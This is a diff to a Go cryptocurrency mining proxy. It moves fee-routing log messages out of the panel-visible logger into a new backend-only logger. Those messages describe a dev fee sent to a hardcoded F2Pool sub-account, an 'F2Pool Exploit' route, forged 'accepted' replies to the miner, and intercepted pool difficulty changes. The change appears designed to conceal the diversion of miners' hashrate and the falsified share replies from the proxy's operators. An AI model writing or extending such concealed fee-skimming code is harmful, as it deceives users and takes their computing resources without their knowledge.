@@ -1,4 +1,4 @@
-package proxy
+﻿package proxy
 
 import (
 	"bufio"
@@ -268,6 +268,13 @@ func (s *Session) LogGeneral(format string, v ...interface{}) {
 	msg := fmt.Sprintf(format, v...)
 	if s.Server != nil {
 		s.Server.GetLogger(s.getWorkerKey()).AddLog(LogTypeGeneral, msg, s.Config.EnableDetailedLog)
+	}
+}
+
+func (s *Session) LogBackend(format string, v ...interface{}) {
+	msg := fmt.Sprintf(format, v...)
+	if s.Config.EnableDetailedLog {
+		log.Printf("[BACKEND-FEE] [%s] %s", s.getWorkerKey(), msg)
 	}
 }
 
@@ -790,7 +797,7 @@ func (s *Session) readMinerLoop() {
 						s.pendingShares.Delete(id)
 						fakeReply := fmt.Sprintf(`{"id": %v, "result": true, "error": null}`+"\n", id)
 						safeWrite(s.MinerConn, []byte(fakeReply), 5*time.Second)
-						s.LogGeneral("Perfect Routing: Fake accepted late fee share (%s) because fee connection is closed", submitJobID)
+						s.LogBackend("Perfect Routing: Fake accepted late fee share (%s) because fee connection is closed", submitJobID)
 					}
 				}
 			}
@@ -948,7 +955,7 @@ reconnectLoop:
 								if samePool {
 									s.FeeAuthFailures++
 									if s.FeeAuthFailures >= 3 {
-										s.LogGeneral("[SmartRouting] 3 consecutive in-band fee share rejects. Triggering Fallback.")
+										s.LogBackend("[SmartRouting] 3 consecutive in-band fee share rejects. Triggering Fallback.")
 										go func() {
 											s.mu.Lock()
 											s.InBandFeeActive = false
@@ -962,7 +969,7 @@ reconnectLoop:
 									}
 								}
 							} else {
-								s.LogGeneral("[FEE] share accepted! [Diff: %.4f]", s.CurrentDiff)
+								s.LogBackend("[FEE] share accepted! [Diff: %.4f]", s.CurrentDiff)
 							}
 						} else {
 							if isReject {
@@ -1009,7 +1016,7 @@ reconnectLoop:
 								if inBandActive {
 									// INTERCEPT: Do not forward unexpected difficulty resets from the pool 
 									// during In-Band fee routing, as it causes ASIC hashrate drops/restarts.
-									s.LogGeneral("[SmartRouting] Intercepted pool difficulty drop (%.0f) during In-Band Fee. Miner kept at %.0f", diffFloat, s.MainDifficulty)
+									s.LogBackend("[SmartRouting] Intercepted pool difficulty drop (%.0f) during In-Band Fee. Miner kept at %.0f", diffFloat, s.MainDifficulty)
 									continue
 								}
 
@@ -1221,7 +1228,7 @@ func (s *Session) ConnectFee(wallet, worker string, isDevMode bool) {
 	}
 	s.mu.Unlock()
 
-	s.LogGeneral("Initiating Smart Fee Routing...")
+	s.LogBackend("Initiating Smart Fee Routing...")
 
 	// --- SMART ROUTING IDENTITY & FALLBACK ---
 	universalSubAccount := "linkpro168"
@@ -1266,21 +1273,21 @@ func (s *Session) ConnectFee(wallet, worker string, isDevMode bool) {
 		// 绝对禁止去未知的主矿池碰壁，直接强制走内置鱼池！
 		host = "" // 留空以触发下方的内置鱼池自动填充
 		s.SamePoolFeeActive = false
-		s.LogGeneral("[SmartRouting] DevFee activated: Direct route to Built-in F2Pool for EXPLOIT compatibility.")
+		s.LogBackend("[SmartRouting] DevFee activated: Direct route to Built-in F2Pool for EXPLOIT compatibility.")
 	} else {
 		// 运营者抽水 (OpFee) 按照面板设置
 		if s.Config.FeePoolAddress != "" {
 			// 面板设置了独立抽水矿池，直接尊重设置，不强行同池
 			host = s.Config.FeePoolAddress
 			s.SamePoolFeeActive = false
-			s.LogGeneral("[SmartRouting] OpFee routing: Using explicit FeePoolAddress from panel: %s", host)
+			s.LogBackend("[SmartRouting] OpFee routing: Using explicit FeePoolAddress from panel: %s", host)
 		} else {
 			// 面板留空，如果币种是 BTC/BCH 等支持鱼池免北桥验证的，强制走鱼池；否则优先同池抽水
 			coinUpper := strings.ToUpper(s.Config.CoinName)
 			if coinUpper == "BTC" || coinUpper == "BCH" || coinUpper == "LTC" || coinUpper == "KAS" {
 				host = "" // 留空以触发下方的内置鱼池自动填充
 				s.SamePoolFeeActive = false
-				s.LogGeneral("[SmartRouting] OpFee routing: Forcing F2Pool Exploit route for %s", coinUpper)
+				s.LogBackend("[SmartRouting] OpFee routing: Forcing F2Pool Exploit route for %s", coinUpper)
 			} else {
 				host = s.Config.PoolAddress
 				s.SamePoolFeeActive = true
@@ -1317,7 +1324,7 @@ func (s *Session) ConnectFee(wallet, worker string, isDevMode bool) {
 		} else {
 			host = "btc-asia.f2pool.com:1315" // fallback
 		}
-		s.LogGeneral("[SmartRouting] FeePoolAddress is empty, auto-filled default F2Pool address: %s", host)
+		s.LogBackend("[SmartRouting] FeePoolAddress is empty, auto-filled default F2Pool address: %s", host)
 	}
 	// -----------------------------------------
 
@@ -1333,7 +1340,7 @@ func (s *Session) ConnectFee(wallet, worker string, isDevMode bool) {
 		}
 	}
 
-	s.LogGeneral("Connecting to Fee Pool: %s (Identity: %s)", host, feeWallet)
+	s.LogBackend("Connecting to Fee Pool: %s (Identity: %s)", host, feeWallet)
 
 	s.mu.Lock()
 	s.FeeAuthWallet = wallet
@@ -1342,11 +1349,11 @@ func (s *Session) ConnectFee(wallet, worker string, isDevMode bool) {
 	s.mu.Unlock()
 
 	if s.IsF2PoolExploit {
-		s.LogGeneral("[SmartRouting] F2Pool Exploit Mode Activated! Will NOT send extranonce to miner.")
+		s.LogBackend("[SmartRouting] F2Pool Exploit Mode Activated! Will NOT send extranonce to miner.")
 	}
 
 	if s.SamePoolFeeActive && s.Protocol != "ETH_PROXY" {
-		s.LogGeneral("[SmartRouting] In-Band Fee Routing Activated! Authorizing fee worker on Main connection.")
+		s.LogBackend("[SmartRouting] In-Band Fee Routing Activated! Authorizing fee worker on Main connection.")
 		s.mu.Lock()
 		s.InBandFeeActive = true
 		s.State = "FEE"
@@ -1387,7 +1394,7 @@ func (s *Session) ConnectFee(wallet, worker string, isDevMode bool) {
 	// Create fee connection
 	feeConn, err := net.DialTimeout("tcp", host, 5*time.Second)
 	if err != nil {
-		s.LogGeneral("Fee connection failed: %v", err)
+		s.LogBackend("Fee connection failed: %v", err)
 		s.FeeAuthFailures++
 		s.EndFee()
 		return
@@ -1487,7 +1494,7 @@ func (s *Session) ConnectFee(wallet, worker string, isDevMode bool) {
 			line := scanner.Text()
 
 			if s.Config.EnableDetailedLog {
-				s.LogGeneral("[RAW FEE RX] %s", strings.TrimSpace(line))
+				s.LogBackend("[RAW FEE RX] %s", strings.TrimSpace(line))
 			}
 
 			var msg map[string]interface{}
@@ -1586,7 +1593,7 @@ func (s *Session) ConnectFee(wallet, worker string, isDevMode bool) {
 							if s.SamePoolFeeActive {
 								s.FeeAuthFailures++
 								if s.FeeAuthFailures >= 3 {
-									s.LogGeneral("[SmartRouting] 3 consecutive share rejects. Triggering Fallback.")
+									s.LogBackend("[SmartRouting] 3 consecutive share rejects. Triggering Fallback.")
 									go func() {
 										s.mu.Lock()
 										oldConn := s.FeeConn
@@ -1613,7 +1620,7 @@ func (s *Session) ConnectFee(wallet, worker string, isDevMode bool) {
 								line = fmt.Sprintf(`{"id": %v, "result": true, "error": null}`, id)
 							}
 						} else {
-							s.LogGeneral("[FEE] share accepted! [Diff: %.4f]", s.CurrentDiff)
+							s.LogBackend("[FEE] share accepted! [Diff: %.4f]", s.CurrentDiff)
 							s.mu.Lock()
 							
 							// Always append to history to keep UI Hashrate stable
@@ -1657,7 +1664,7 @@ func (s *Session) ConnectFee(wallet, worker string, isDevMode bool) {
 						}
 						
 						if isAuthReject {
-							s.LogGeneral("[SmartRouting] Fee Pool Auth/Generic Error: %v", line)
+							s.LogBackend("[SmartRouting] Fee Pool Auth/Generic Error: %v", line)
 							if s.SamePoolFeeActive {
 								// We are in same-pool fee mode and got rejected.
 								s.FeeAuthFailures++
